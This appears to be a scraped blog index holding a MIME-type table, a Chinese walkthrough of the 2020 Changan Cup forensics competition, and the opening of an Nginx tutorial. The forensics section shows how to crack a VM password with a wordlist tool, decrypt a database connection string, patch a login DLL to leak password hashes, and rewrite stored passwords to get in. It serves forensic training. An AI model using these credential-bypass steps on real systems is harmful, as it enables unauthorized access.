x-matroska / mkv 多媒体容器格式，支持多轨音视频 application 子类型（常见格式） 说明 json 结构化数据交换格式，广泛用于 API xml 结构化文档或数据 pdf Adobe的便携文档格式 zip 常见的压缩文件格式 x-www-form-urlencoded HTML表单默认提交格式（键值对编码） octet-stream 二进制数据流，常用作通用下载类型（未知二进制数据） msword 旧版Microsoft Word 文档（.doc） vnd.ms-excel 旧版Microsoft Excel 表格（.xls） vnd.openxmlformats-officedocument.wordprocessingml.document 新版Office Word（.docx） vnd.openxmlformats-officedocument.spreadsheetml.sheet 新版Office Excel（.xlsx） x-tar .tar归档文件格式，用于打包多个文件 x-7z-compressed 7-Zip压缩格式（.7z） x-rar-compressed RAR压缩格式（.rar） x-debian-package Debian软件包格式（.deb） x-executable Linux/Unix可执行文件（无拓展名时也可用此类型） x-shockwave-flash Flash动画格式（已淘汰） javascript JavaScript代码**（部分浏览器仍使用application而非text）** multipart 子类型（常见格式） 说明 form-data 用于上传文件的表单数据 mixed 多部分邮件体，每部分可以是不同类型 alternative 同一内容的多种表示（如 HTML 和纯文本版本的邮件） byteranges 用于分块下载/断点续传 message 子类型（常见格式） 说明 rfc822 标准电子邮件消息格式 partial 邮件的部分片段 external-body 邮件外部引用内容 font 子类型（常见格式） 说明 woff, woff2 Web优化字体格式 truetype / ttf 常见字体格式 opentype / otf TTF的扩展格式，功能更丰富 embedded-opentype EOT字体，IE专用的Web字体格式 ","date":"2025-08-06T13:08:02+08:00","image":"http://picture.928330.xyz/typora/fb86b7621fba4d5ef41dce013ca5a72e.jpg","permalink":"https://blog.928330.xyz/p/linux%E5%91%BD%E4%BB%A4%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E7%AF%87/","title":"Linux命令（文件管理篇）"},{"content":"题目：https://ks.wjx.top/vj/rX5h1WB.aspx\n难难难，不多说了，直接开始\n火眼仿真创建虚拟机 要创建虚拟机，必须要有VMware环境\n创建虚拟机 -\u0026gt; 添加镜像 -\u0026gt; 选择镜像文件之后在上面勾选对应镜像 -\u0026gt; 点击确定\n选择生成位置（虚拟机位置） -\u0026gt; 开始创建\n创建完成之后会给出账号密码，可以记忆一下，或者重置为空（推荐）\npart1 1.检材1的操作系统版本是 创建完虚拟机后，就会自动识别出系统版本：\nCentOS Linux release 7.6.1810(Core) 2.检材1中，操作系统的内核版本是 找半天不知道检材1怎么登录的root账号，结果最后试出来了密码\u0026hellip;\u0026hellip;：\nroot/123456 后面才知道这是火眼帮我改的，我们也可以手动设置\n创建虚拟机 -\u0026gt; 高级设置：\n这里就可以设置各种内容\n纯命令行界面还是太难操作了，使用Xterminal连接一下\nsystemctl start sshd打开服务，看一下监听端口，是7001：\n在Xterminal连接后，查看内核版本：\nuname -r 3.10.0-957.el7.x86_64 3.检材1磁盘包含一个LVM逻辑卷，该LVM开始的逻辑区块地址（LBA）是 查看磁盘分区：\nfdisk -l 根据System字段类型里的LVM判断/dev/sda2是我们要找的分区\n2099200 4.检材1中网站\u0026quot;www.kkzjc.com\u0026quot;对应的Web服务对外开放的端口是 尝试使用nmap扫描服务器端口，但没有给出什么有用的信息\n使用grep命令直接在服务器上搜索\u0026quot;www.kkzjc.com\u0026quot;\n因为是网站的配置文件通常在 /etc目录下，现在/etc下搜索更快一点：\n32000 5.检材1所在的服务器共绑定了几个对外开放的域名 既然/etc下有配置文件，就把nginx和apache的都搜一遍： 看来只有nginx，一共开放了三个域名\n3 6.检材1所在的服务器的原始IP地址是 看不明白这一题问的是什么，跟着wp做一遍\n见第九题\n7.嫌疑人曾经远程登录过检材1所在的服务器，分析并找出其登录使用的IP地址是 (并使用该地址解压检材2) 使用last命令查看，发现有两个ip登陆过该服务器（192.168.204.1是我使用Xterminal连接的）： 正确的ip可以解压检材2，检材2是分卷压缩，使用winrar解压缩\n192.168.99.222 8.检材1所在的服务器，其主要功能之一为反向代理。找出\u0026quot;www.kkzjc.com\u0026quot;转发的后台网站所使用的IP地址是 首先查看命令行history，发现该服务器有docker镜像： 开启docker服务，看一眼镜像和容器都有哪些\nsystemctl start docker systemctl status docker docker images docker ps 这里发现一个正在运行的nginx服务器，而且他的映射到本机的端口号是8091，和第四题配置文件中的一样：\n进入docker的交互式终端，查看该终端里运行过的命令：\ndocker exec -it 08f64376a2e3 /bin/bash history 可以看到曾经多次查看过配置文件/etc/nginx/conf.d/hl.conf：\n我们也打开这个配置文件看看，发现了反向代理的ip：\n192.168.1.176 9.嫌疑人曾经从题7的IP地址，通过WEB方式远程访问过网站，统计出检材1中该IP出现的次数为 查看docker容器日志，统计其中的ip出现次数，-c参数可输出统计总数：\ndocker logs 08f6437 | grep -c \u0026#34;192.168.99.222\u0026#34; 18 同时在日志还能发现这个ip在访问服务器的时候是由ip192.168.99.3接受的，且端口号就是之前的8091：\n这样就发现了题6的答案：\n192.168.99.3 part2 10.检材 2 的原始磁盘 SHA256 值为 2D926D5E1CFE27553AE59B6152E038560D64E7837ECCAD30F2FBAD5052FABF37 11.检材2 所在计算机的OS内部版本号是 18363.1082 12.检材2所在计算机最后一次正常关机的时间为（精确到秒） 2020-09-22 13:15:34 13. 检材2中，VMware 程序的安装时间为（精确到分钟） 2020-09-18 17:57 14.检材2中，Vmware.exe程序总计启动过几次 8 15.嫌疑人通过 Web 方式，从检材2访问检材1所在的服务器上的网站时，连接的目标端口是 在chrome浏览器中发现代理登录的记录：\n登录的端口和之前看到的代理端口一致\n8091 16.接15题，该端口上运行的进程的程序名称（Program name）为 docker-proxy 17.嫌疑人从检材2上访问该网站时，所使用的域名为 下面就是对应域名（同样是代理登录8091端口）：\nwww.sdhj.com 18.检材2 中，嫌疑人所使用的微信ID是 检材二的电脑里面并没有安装微信\n但在检材二嵌套证据识别部分能看见一个ios手机备份，查看路径能发现是在分区三下\n把当前文件夹下的所有文件导出作为文件集合作为新检材分析，发现里面有微信号：\nsstt119999 19.分析检材2，嫌疑人为推广其网站，与广告位供应商沟通时使用的通联工具的名称为 接上一步，创建出来的ios镜像不完整，找不到题目要求的信息\n真正的做法是使用同样位于分区三下的另一个镜像：\n这样就能发现沟通工具：\ntelegram 20.分析检材2，嫌疑人使用虚拟货币与供应商进行交易，该虚拟货币的名称是 在上题聊天记录中找到一张收款码图片，用的是狗狗币DOGE\nDOGE 21.上述交易中，对方的收款地址是 见上图\nDPBEgbwap7VW5HbNdGi9TyKJbqTLWYYkvf 22.上述交易中，嫌疑人和供应商的交易时间是 这里不知道怎么写，wp说可以通过Dogecoin浏览器使用交易地址搜索到交易： https://explorer.coinex.com/doge 2020-09-20 12:19:46 23.上述交易中，嫌疑人支付货币的数量为 见上题图\n4000 24.检材2中，嫌疑人使用的虚拟机的虚拟磁盘被加密，其密码为 虚拟机在嵌套证据识别中就已经见过，导出备用，这里以防万一我导出了整个存放虚拟机的文件夹：\n微信聊天记录里说他忘记了密码，要去github上找办法： 之前翻看浏览器的时候就看见了github网页，我们也看看那个破解工具网站：\n-v指定虚拟机，-d指定字典，就使用它演示使用的这条命令：\npython3 pyvmx-cracker.py -v Windows10x64.vmx -d wordlist.txt 得到密码：\nzzzxxx 25.检材2中，嫌疑人发送给广告商的邮件中的图片附件的 SHA256值为(忽略邮件状态) 下面的步骤建议直接导入火眼证据分析，使用虚拟机反而徒增麻烦\n打开虚拟机，发现有密码：\n办法是使用火眼仿真，仿真完毕就会给出密码\n不过在此之前，我们要先给虚拟机的加密给取消：\n再次使用火眼仿真就能得到密码：\n之前聊天记录提到广告使用邮件发送，在桌面的邮箱软件的草稿箱找到广告图片：\n保存到桌面，使用certutil计算sha256（这个版本的powershell没有getfilehash）：\ncc7ea3ab90ab6b28417e08c715c243ce58ea76d71fd141b93f055a58e9ba561a 26.检材2中，嫌疑人给广告商发送广告图片邮件的发送时间是(忽略邮件状态) 2020-09-20 12:53 27.检材2中，嫌疑人的邮箱密码是 把.vmdk文件作为镜像文件导入成新检材（早知道能导入我就不那么别扭使用虚拟机了气死我了）：\nhonglian7001 28.检材2中，嫌疑人使用了什么远程管理工具，登录了检材1所在的服务器？ Xshell不是全称，具体名称在安装软件中看，或者虚拟机里面也能看见：\nXshell6 29.检材2中，嫌疑人使用上述工具连接服务器时，使用的登录密码为 qwer1234!@#$ part3 30.检材3 的原始磁盘 SHA256 值为 FF593FCCB3770B8845A3334631F8E80807638EE722C5AA7B34E877589857C3BA 31.检材3 所在的计算机的操作系统版本是 Windows Server 2008 HPC Edition x64 32.检材3中，部署的网站名称是 火眼仿真检材三（一定记得把密码重置成空！！！）\n登录server账号，打开服务器管理器：角色 -\u0026gt; web服务器 -\u0026gt; internet信息服务 -\u0026gt; win -\u0026gt; 网站\n可以看到有一个托管的网站：\ncard 33.检材3中，部署的网站对应的网站根目录是 高级设置： C:\\inetpub\\wwwroot\\v7w 34.检材3中，部署的网站绑定的端口是 同上图：\n80 35.检材3中，具备登陆功能的代码页，对应的文件名为 右侧导航栏浏览，发现一个名为web的配置文件：\n使用记事本打开，可以看见里面有两条疑似与login相关的配置：\n分别查看两个文件，发现都跟登录有关：\n本地访问一下，发现竟然都是登录界面：\n分不清，真的分不清啊，都写上去吧：\nglogin.aspx dllogin.aspx 不过其实是有办法分开的，具体看下面一题\n36.检材3中，请对网站代码进行分析，网站登录过程中，代码中对输入的明文密码作了追加什么字符串处理 再次检索前面两个文件，发现只有dllogin.aspx涉及到了对密码字符串的处理：\nOvO 同时也知道了35题的正确答案：\ndllogin.aspx 37.检材3中，请对网站代码进行分析， 既然是找动态链接库，那么在dllogin.aspx里面搜索一下dll：\n虽然没有找到，不过也给了点启发，问问ai： 为了保险起见，我们直接去检材三里面搜索一下是否有这个文件：\nApp_Web_dllogin.aspx.7d7c2f33.dll 38.检材3中，网站登录过程中，后台接收到明文密码后进行加密处理，首先使用的算法是 Encryption 中的什么函数 dll文件编译后无法查看，没有头绪，原来是需要逆向dll\n下载net反编译工具dnspy：https://github.com/dnSpy/dnSpy/releases\n导出上题找到的dll文件，拖入dnspy寻找：\nAESEncrypt 39.检材3中，分析该网站连接的数据库地址为（并使用该地址解压检材4） 多少沾点玄学在这里了\n在逆向出来的.net中发现引用了一个数据库有关的库DBManager：\n搜索发现这个库也在检材三中：\n导出分析，在最底部看见数据库地址：\n192.168.1.174 40.检材3中，网站连接数据库使用的密码为 在DBManager里面找到下面这一段：\nprivate void Open() { if (this.Conn == null) { this.Conn = new SqlConnection(this.ConnStr); } } 只在this.Conn为null时使用ConnStr，也就是上一题得到的密码\n如果不为空，那么优先使用的是AESDecrypt解密出来的连接串，所以我们要想法解密：\nMcyj19i/VubvqSM21YPjWnnGzk8G/GG6x9+qwdcOJd9bTEyprEOxs8TD9Ma1Lz1Ct72xlK/g8DDRAQ+X0GtJ8w== 因为这是Encryption类下面的方法，并且都是windows系统，我们也可以在本机调用解密：\nAdd-Type -Path \u0026lt;Path/to/DBManager.dll\u0026gt; [DBManager.Encryption]::AESDecrypt( \u0026#34;Mcyj19i/VubvqSM21YPjWnnGzk8G/GG6x9+qwdcOJd9bTEyprEOxs8TD9Ma1Lz1Ct72xlK/g8DDRAQ+X0GtJ8w==\u0026#34;, \u0026#34;HL\u0026#34;, \u0026#34;forensix\u0026#34; ) 再次印证了39题答案是正确的，并且给出了真正的密码：\nc4f2737e88 41.检材3中，网站连接数据库服务器的端口是 见上题，ip后就是端口：\n1433 part4 做好准备，接下来的路不是一般的难走\n42.检材 4 的原始磁盘SHA256 值为 E5E548CCAECD02608A0E053A5C7DCDBFBDD4BE5B0E743EB9DC8E318C369BEBC8 43.重构该网站，分析嫌疑用户的推广链接中参数里包含的 ID 是 现在的目标是连接检材3（服务器）和检材4（数据库）\n登录检材4，看一眼history：\n看来是先尝试了在本机安装数据库，后面还是选择使用docker了\n启动docker，查看现在的docker容器，启动sql1：\n检材3能知道连接数据库的地址是192.168.1.174，所以要修改检材4的ip\n先在编辑 -\u0026gt; 虚拟网络编辑器中关闭DHCP，防止使用DHCP分配的地址\n应用并确定后，进入检材4，修改网卡配置文件：\nvi /etc/sysconfig/network-scripts/ifcfg-ens33 改成下面这样：\n重启网络，用ip a命令查看配置是否成功：\n再次登录检材3，ping一下检材4，看看是否能通： 说明他们在同一个网段了，我们之前的配置是成功的\n由于检材三没有数据库应用，接下来我们要在本机连接数据库，那就要让本机和他们也在同一网段\n打开vmware -\u0026gt; 编辑 -\u0026gt; 虚拟网络编辑器，把使用的，然后更改子网IP和NAT网关为192.168.1.0/24网段：\n点击应用和确定，在本机ipconfig一下\n可以看见net8，也就是nat模式，ipv4地址是192.168.1.1，配置成功： 使用40题的解密结果测试连接，结果报错了：\n需要下载SQL SERVER驱动程序：\nhttps://learn.microsoft.com/zh-cn/sql/connect/odbc/download-odbc-driver-for-sql-server?view=sql-server-ver16 安装后再次测试连接，成功！\n接下来回到App_Web_dllogin.aspx.7d7c2f33.dll中\n在登录部分我们可以看到调用了DUserLogin函数，而这个函数又是来自WDUser类：\n这个类来自哪里呢？看不出来，问一下ai吧\n不嫌麻烦保险起见也可以全部导出using了的dll，这个操作其实是最正确的，后面也会用上\n不过这里就取个巧先：\n既然不是系统库，那么我们照样能在检材3里面找到这个dll，老样子导出用dnspy分析\ndnspy很方便，如果有对应函数，点击即可跳转至对应位置，果然是在WBus里面：\n在DUserLogin函数里使用了PD_UserLogin这个数据库函数，我们在数据库里面找到它：\n函数说明登录方式分两种，由TD_Webs表的DW_Type决定：\nDW_Type = 0：只允许指定的DW_DU_Id用户登录 DW_Type = 1：允许任意用户登录（只验证用户名和密码） 并且在之前反编译出来的dll登录逻辑中，我们知道了用户名密码是经过加密的，存放在表里的是加密过的值：\ntext2 = Encryption.AESEncrypt(text2, \u0026#34;forensix\u0026#34;, \u0026#34;HL\u0026#34;); text2 = FormsAuthentication.HashPasswordForStoringInConfigFile(text2, \u0026#34;MD5\u0026#34;); 二者结合，如果要让某个用户能登录，就要确保他的DU_Id =TD_Webs.DW_DU_Id，并且将他的密码改为指定值加密后的结果写入DU_Pwd\n我们先找到用户表：\n在检材二中的chrome浏览器的表单记录中，我们能找到liwente1314520的登录记录：\nliwente1314520对应的DU_Id 是1001，也对应TD_Webs表里面的aaaa.bbbb，相应DW_Type是0\n在检材3的登录页面逻辑中我们知道，登录方式是\u0026quot;密码\u0026quot;+\u0026ldquo;OvO\u0026rdquo;\n我们用这种方式制作一个密码，先AESEncrypt加密，再MD5加密（这一步我做错了，先别急着复制，往下看）：\nAdd-Type -Path \u0026lt;Path/to/DBManager.dll\u0026gt; [DBManager.Encryption]::AESEncrypt( \u0026#34;111OvO\u0026#34;, \u0026#34;HL\u0026#34;, \u0026#34;forensix\u0026#34;) 把1001对应的TD_Webs.DW_DU_Id改成192.168.1.176，也就是检材3的ip，让我们能访问：\nTD_User.DW_Pwd改成加密的密码：\n保存之后，在检材4重启sql1容器，在检材3中开启ASP.NET State Service服务：\n之后可以在本机访问http://192.168.1.176/dl进行登录操作：\n可是到这一步，我登录竟然不成功！\n我以为是之前的md5没有大写的原因，可是就算我改成了大写，仍旧是不成功\n后面发现是我把加密函数参数位置写错了，正确应该是这样（太铸币了啊）：\nAdd-Type -Path \u0026lt;Path/to/DBManager.dll\u0026gt; [DBManager.Encryption]::AESEncrypt( \u0026#34;111OvO\u0026#34;, \u0026#34;HL\u0026#34;, \u0026#34;forensix\u0026#34;) 不过当时我认为走流程自己计算密码这一步显然是走不太通了，那我们就得换一个思路：直接让它为我们输出密码\n进入控制登录的App_Web_dllogin.aspx.7d7c2f33.dll，在oCmd函数部分右键，编辑：\n加入和修改这三处，目的是登录失败的时候弹窗弹出当前使用密码加密后的md5值： 点击编译，注意一定要把上面的非系统引用库也导出并拖进dnspy，否则编译会失败：\n编译完成之后点击保存（名称不能变），复制并替换检材三C:\\inetpub\\wwwroot\\v7w\\bin下的同名dll：\n之后重启网站：\n再次访问http://192.168.1.176/dl，使用账号liwente1314520，密码随便（但是一定要记住）登录：\n果然报错，不过也带出了加密后的密码！\n复制这个md5值作为密码，再次更改数据库内容，保存，重启sql1服务\n我们就能使用上一次登录的密码登录了：\n总算是搭建并登录了，也不能忘了我们的目标：嫌疑用户的推广链接中参数里包含的ID\n一同翻找，在代理信息栏里发现了推广链接：\nabe6d2ee630379c3 44.重构该网站，该网站后台的代理用户数量为 用户列表里面数一下，一共三页：\n26 45.重构该网站，该网站注册用户中共有过几个代理(包含删除的数据) 上一题是代理用户数量，这一题问的是包括删除的数据，我们就需要找到对应的表\n鼠标移动到用户列表按钮，左下角会显示对应的aspx文件：\n在检材3里面搜索该文件（火眼也行）：\n在文件开头找到使用的库，其实也就是上图我们搜出来的第二个文件：\n导入dnspy分析，同样找到和数据库交互的函数：\n它同样是在WBus的WUUser里面，使用的表名是TU_User：\n数据库里面找到该表，统计一下总数：\n32 46.重构该网站，对补发记录进行统计，统计 2019 年10 月1日后补发成功的金额总值 分析方法和上一题一模一样，就是网站配置文件 -\u0026gt; dll -\u0026gt; 逆向找数据库表\n同样的，我们找到补发测试的文件：\n中间寻找的过程就跳过，直接上逆向结果：\n这里找到的VY_TestLog不是表，是一个视图：\n在dll里面我们还能知道补发成功的逻辑：\nif (dataTable.Rows[i][\u0026#34;YY1T_Type\u0026#34;].ToString() == \u0026#34;3\u0026#34;) 也就是说，如果YY1T_CState == \u0026quot;100\u0026quot;，则认为是成功的\n我们只需要查询视图中YY1T_CState字段为100，且YY1T_CDate在2019.10.1后的补发金额（YY1T_Money）总值：\nselect sum(YY1T_Money) from VY_TestLog where YY1T_CState = 100 and YY1T_CDate \u0026gt; \u0026#39;2019-10-01 00:00:00\u0026#39; 138408.0000 47.检材 4 中，对\u0026quot;TX_IpLog\u0026quot;表进行分析，所有在\u0026quot;武汉市\u0026quot;登录的次数为 找到该表：\n没什么弯绕，就是sql查询：\nselect count(*) from TX_IpLog where XIL_Info like \u0026#39;\u0026#39;%武汉%\u0026#39;\u0026#39; 2829 48.重构该网站，该嫌疑人下属代理\u0026quot;liyun10\u0026quot;账户下的余额有多少元 点击结算管理，显示出了余额，说明我们页面没有找错：\n找到对应aspx文件，找dll，逆向：\n很奇怪，这里竟然什么逻辑也没有，猜测是继承的父类Page_zhye\n这里唯一一个非系统库就是RootDPage，同样在检材3里面找到导出逆向\n果然，里面写出了完整的余额查询逻辑，而所有数据来源都是MInfo：\n这个函数也来自WBus，里面调用的是数据库中间处理函数PD_MInfo：\n在数据库找到PD_MInfo这个函数：\n这个查询里面涉及了很多张表，一一查看\n最终，在TD_MJiFen里面能找到一条数据，id就是我们登录的账号liwente1314520的，余额也对应：\n可是除此之外再也找不到其他的用户了，这是怎么回事？\n之前我们有使用到过用户表，是TU开头，而这个表是TD开头，那么用户是否也有一张一样的表呢？\n果然，我们找到了TU_MJiFen表！\n这个里面记录的就是所有用户的余额等信息，根据TD_MJiFen表，_JiFen字段就是真正的余额：\n同样的，我们还能找到对应的PU_MInfo函数：\n在TU_User表里面，我们能找到liyun10对应的id是1049：\n根据之前的PU_MInfo函数，它比对的是UMJF_UU_ID，也就是说在这个字段找1049：\n或者直接使用sql语句查询：\nselect UMJF_JiFen from TU_MJiFen join TU_User on UMJF_UU_Id = UU_Id where UU_Ln = \u0026#39;liyun10\u0026#39; 这就得到了liyun10的余额\n不过这种方法太过麻烦，而且有一定的运气因素，万一猜错了表名什么的就完蛋了\n换一种方式，在用户列表里面直接找到liyun10，进入后台：\n直接访问是失败的：\n在前面加上服务器ip，就能自动跳转到用户后台管理了：\n192.168.1.176/res/aspx/uin.aspx?user=liyun10\u0026amp;pwd=F58249F4A628AE7B35753EA8416BA943\u0026amp;t=fqgl 在结算管理里面找到余额：\n1066449 其实做到这里也就知道为什么之前的方法不能直接找到用户余额表了，因为之前登录的管理员账号使用的结算管理页面.aspx文件和用户使用的不一样，我直接找只能找到管理（？的余额，总之不是liyun10的\n另外，直接看数据库余额是有小数部分的，但是答案格式只说是\u0026quot;123456\u0026quot;这样的纯数字，不知道会不会有冲突\n49.接上一题，该用户的推广ID是 链接代码中能看见：\nd0fdd7a9a010d37e 50.接上一题，该代理商户的最后一次登陆时间是 登录日志里面啥也没有，注册信息里面倒是有：\n2016/9/5 17:09:13 总算是做完了，part4真的是异常的艰难啊\n","date":"2025-07-26T13:22:12+08:00","image":"http://picture.928330.xyz/typora/f99f347d5c5b4907bc54e0e6b9b714e8.png","permalink":"https://blog.928330.xyz/p/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/","title":"长安杯2020取证总结"},{"content":"开玩笑的，其实nginx和apache一样好用\napache移步：Apache入门 什么是Nginx Nginx（发音为 \u0026ldquo;engine-X\u0026rdquo;）是一款开源的、高性能的HTTP和反向代理服务器\n它的设计哲学是提供极致的性能、稳定性、丰富的功能、简单的配置和低资源消耗，看上去就很厉害\nNginx采用事件驱动的异步非阻塞架构\n与传统的Apache等服务器为每个请求创建一个新进程或线程不同，Nginx使用一个主进程和少数几个工作进程\n主进程负责读取配置、管理工作进程，而真正处理网络请求的是工作进程\n每个工作进程都是单线程的，异步地处理成千上万个并发连接\n这种模型避免了创建和销毁进程/线程的开销以及上下文切换的成本，因此能以极低的内存占用应对高并发场景\n接下来我们会介绍直接安装的Nginx，也会顺带介绍通过Docker容器启动的Nginx\n二者在活动状态控制和日志方面有些区别，配置基本一致\n主要用法 Web服务器 直接向客户端提供静态资源（如HTML、CSS、图片）的服务\n由于其高效的文件读取和网络传输能力，Nginx在处理静态内容方面表现极其出色,适合搭建博客\n反向代理服务器 它是是客户端和后端真实服务器之间的中间人\n它可以将客户端请求转发到后端的应用服务器（如Node.js、Java、Python应用），并将后端响应返回给客户端，从而实现请求分发、负载均衡，并能隐藏后端服务的真实IP和端口，提升安全性\n负载均衡器 当后端有多台服务器时，Nginx可以根据预设的策略将请求分发到这些服务器上，从而分担单一服务器的压力\nAPI网关 在微服务架构中，Nginx可以作为所有API请求的统一入口，执行如身份验证、速率限制、日志记录、服务发现等通用功能\n目录结构 不同来源 通过不同方式安装的nginx的默认目录结构都会有所差别\n官方Nginx包（从 nginx.org） 从Nginx下载官方提供的.rpm/.deb包安装\n/ # 根目录 ├── etc/ │ └── nginx/ # 配置文件目录 │ ├── nginx.conf # 主配置文件（Nginx 的核心配置） │ ├── mime.types # MIME类型映射表 │ └── conf.d/ # 子配置目录（用于虚拟主机） │ └── default.conf # 默认网站配置文件 │ ├── usr/ │ ├── sbin/ │ │ └── nginx # 主程序二进制文件 │ └── share/ │ └── nginx/ │ └── html/ # 默认 Web 根目录 │ ├── index.html # 默认欢迎页面 │ └── 50x.html # 服务器错误页面（如 500、502） │ ├── var/ │ └── log/ │ └── nginx/ # 日志文件目录 │ ├── access.log # 访问日志 │ └── error.log # 错误日志 │ └── lib/ └── systemd/ # 服务管理相关 └── system/ # Nginx systemd 配置 └── nginx.service 源码编译安装 从Nginx官方下载源码.tar.gz，自己编译安装\n/ # 根目录 └── usr/ └── local/ └── nginx/ ├── sbin/ │ └── nginx # 主程序二进制文件 ├── conf/ │ ├── nginx.conf # 主配置文件 │ ├── mime.types # MIME类型映射表 │ └── conf.d/ # 子配置目录 │ └── default.conf # 默认网站配置文件 ├── html/ # 默认 Web 根目录 │ ├── index.html # 默认欢迎页面 │ └── 50x.html # 服务器错误页面 └── logs/ # 日志文件目录 ├── access.log # 访问日志 └── error.log # 错误日志 Debian/Ubuntu官方仓库 通过apt安装\n虽然apt也是调用dpkg安装.deb包，但debian/ubuntu维护的.deb包和官方打包的不太一样，因此web根目录等等路径和直接使用官方包安装会有所差别\n/ # 根目录 ├── etc/ │ └── nginx/ # 配置文件目录 │ ├── nginx.conf # 主配置文件 │ ├── mime.types # MIME类型映射表 │ └── conf.d/ # 子配置目录 │ └── default.conf # 默认网站配置文件 │ ├── usr/ │ └── sbin/ │ └── nginx # 主程序二进制文件 │ ├── var/ │ ├── www/ │ │ └── html/ # 默认 Web 根目录 │ │ ├── index.html # 默认欢迎页面 │ │ └── 50x.html # 服务器错误页面 │ └── log/ │ └── nginx/ # 日志文件目录 │ ├── access.log # 访问日志 │ └── error.log # 错误日志 │ └── lib/ └── systemd/ # 服务管理相关 └── system/ # Nginx systemd 配置 └── nginx.service CentOS/RHEL官方仓库 通过yum/dnf安装\n路径、配置和布局就是官方Nginx提供的.rmp包规范的结构，所以和第一种很像\n/ # 根目录 ├── etc/ │ └── nginx/ # 配置文件目录 │ ├── nginx.conf # 主配置文件 │ ├── mime.types # MIME类型映射表 │ └── conf.d/ # 子配置目录（用于虚拟主机） │ └── default.conf # 默认网站配置文件 │ ├── usr/ │ └── sbin/ │ └── nginx # 主程序二进制文件 │ ├── usr/ │ └── share/ │ └── nginx/ │ └── html/ # 默认 Web 根目录 │ ├── index.html # 默认欢迎页面 │ └── 50x.html # 服务器错误页面 │ ├── var/ │ └── log/ │ └── nginx/ # 日志文件目录 │ ├── access.log # 访问日志 │ └── error.log # 错误日志 │ └── usr/ └── lib/ └── systemd/ # 服务管理相关 └── system/ # Nginx systemd 配置 └── nginx.service Docker镜像（官方 Nginx） 没有固定结构，因为Docker镜像只是一个文件系统的快照，完全取决于镜像制作者，具体看上面四种\n这里以官方镜像为例，也就是\n/ # 根目录 ├── etc/ │ └── nginx/ # 配置文件目录 │ ├── nginx.conf # 主配置文件（Nginx 的核心配置） │ ├── mime.types # MIME类型映射表 │ └── conf.d/ # 子配置目录（用于虚拟主机） │ └── default.conf # 默认网站配置文件 │ ├── usr/ │ ├── share/ │ │ └── nginx/ │ │ └── html/ # 默认的 Web 根目录 │ │ ├── index.html # 默认欢迎页面 │ │ └── 50x.html # 服务器错误页面（如 500、502） │ └── sbin/ │ └── nginx # 主程序二进制文件 │ └── var/ └── log/ └── nginx/ # 日志文件目录（部分精简镜像无日志输出） ├── access.log # 访问日志（默认可能未启用） └── error.log # 错误日志（默认可能未启用） 一些问题 日志文件 Docker镜像的Nginx日志默认输出到标准输出/错误，而不是文件中\n在编译安装（make install）的传统方式中，Nginx日志会记录在：\n/usr/local/nginx/logs/ 在.deb包和系统包安装（apt/yum）的方式中，Nginx日志会记录在：\n/var/log/nginx/ 而在Docker官方镜像中，日志默认不写入上面的文件，而是输出到标准输出和标准错误\n执行以下命令：\nls -l /var/log/nginx/ 我们可以看到如下输出：\nlrwxrwxrwx 1 root root 11 Jul 15 01:14 access.log -\u0026gt; /dev/stdout lrwxrwxrwx 1 root root 11 Jul 15 01:14 error.log -\u0026gt; /dev/stderr 虽然nginx.conf配置的是/var/log/nginx/access.log，但由于它是个符号链接，等于就是输出到了标准输出\n这些输出会被记录到docker容器的日志里，docker中查看日志的方式：\ndocker logs \u0026lt;容器ID\u0026gt;/\u0026lt;名称\u0026gt; 配置文件 /etc/nginx/conf.d/是主配置目录，/etc/nginx/nginx.conf是主配置文件\nNginx的主配置文件是/etc/nginx/nginx.conf，在这个文件中有这样一行代码：\ninclude /etc/nginx/conf.d/*.conf; include是Nginx配置语言中的指令，用于包含其他配置文件\n也就是说，/etc/nginx/nginx.conf默认会包含/etc/nginx/conf.d/这个子目录中的所有配置（.conf）\nWeb 根目录 不同安装方式下，Nginx的默认Web根目录不同\n在编译安装（make install）的传统方式中，Web根目录在：\n/usr/local/nginx/html/ 默认包含以下文件：\nindex.html # 默认欢迎页面 50x.html # 服务器错误页面 在Debian/Ubuntu系统包安装方式中，Web根目录在：\n/var/www/html/ 在官方包和CentOS/RHEL系统包安装方式中，Web根目录在：\n/usr/share/nginx/html/ 可以通过修改Nginx配置文件中的root指令来改变Web根目录：\nserver { listen 80; server_name localhost; root /path/to/your/webroot; index index.html; } 关于server块我们后面会细讲\nsystemd的位置 其实这个不是nginx的问题，而是一个历史问题 —— linux文件系统的演进\n**FHS，全称Filesystem Hierarchy Standard（文件系统层次结构标准）**是 Linux 系统的一个标准，规定了 目录结构、文件存放位置及用途，让不同 Linux 发行版在文件布局上保持一致性\n在早期，FHS规定/lib/用于存放核心库文件和与系统启动紧密相关的可执行文件（比如init系统所需的库、二进制），而/usr/lib/用于存放非核心、额外安装的软件库\n但在systemd出现后，由于systemd的服务单元文件属于系统服务配置，与系统启动密切相关，但又不是二进制程序本身，于是他的位置有了一些不同：\nDebian/Ubuntu：选择/lib/systemd/system/放置核心包的单元文件（比如nginx、sshd），保证系统启动时总能找到 CentOS/RHEL/Fedora：更倾向使用/usr/lib/systemd/system/，虽然/lib/systemd/system/也存在，但它通常是指向前者的符号链接 现在/lib/和/usr/lib/往往通过软链接或包管理器自动管理，保证旧路径和新路径都能访问到服务单元文件，所以你会看到同样的 Nginx 服务在不同发行版或者不同安装方式下，路径可能不同\n常用命令 Nginx直接安装在本机时，使用systemctl或者service命令控制\n通过Docker容器使用时，就按照Docker容器的使用方法（没用过看这里：快速上手Docker ）\n下面介绍一些Nginx本身的命令：\n查看版本 nginx -v 输出当前安装的Nginx版本号，用于确认是否正确安装Nginx及其版本信息\n检查配置文件语法 nginx -t 在每次修改配置文件后必须执行\n使用后，主进程会fork一个临时子进程，子进程尝试解析所有配置文件，但不会绑定端口或真正启动服务\n若语法无误，会提示syntax is ok和 test is successful\n若有错误，会明确指出是哪一行、哪个文件配置有误\n重新加载配置文件 nginx -s reload 强制停止 nginx -s stop 配置文件 Nginx的所有功能都是通过配置文件nginx.conf来驱动的\n该文件主要由多个配置块组成，这些块由花括号{}界定，可以嵌套，形成了层级分明的结构\n一个典型的nginx.conf结构如下：\nnginx.conf ├── 全局块 ├── events块 └── http块 └── server块（可多个） └── location块（可多个） 具体示例如下：\nuser nginx; worker_processes auto; error_log /var/log/nginx/error.log warn; pid /var/run/nginx.pid; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; 